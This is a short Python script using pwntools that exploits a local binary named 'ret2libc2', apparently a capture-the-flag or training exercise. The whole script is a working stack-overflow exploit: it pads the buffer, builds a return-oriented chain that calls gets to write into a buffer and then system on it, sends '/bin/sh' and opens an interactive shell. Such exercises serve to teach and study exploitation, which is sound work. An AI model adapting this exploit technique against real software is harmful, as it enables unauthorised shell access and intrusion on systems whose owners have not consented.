from pwn import *

p = process('./ret2libc2')

gets_addr = 0x08048460
system_addr = 0x08048490
popebx_addr = 0x0804843d
buf2_addr = 0x0804A080

payload = flat([
    'a' * 0x70, gets_addr, popebx_addr, buf2_addr, system_addr, 0xdeadbeef,
    buf2_addr
])

p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
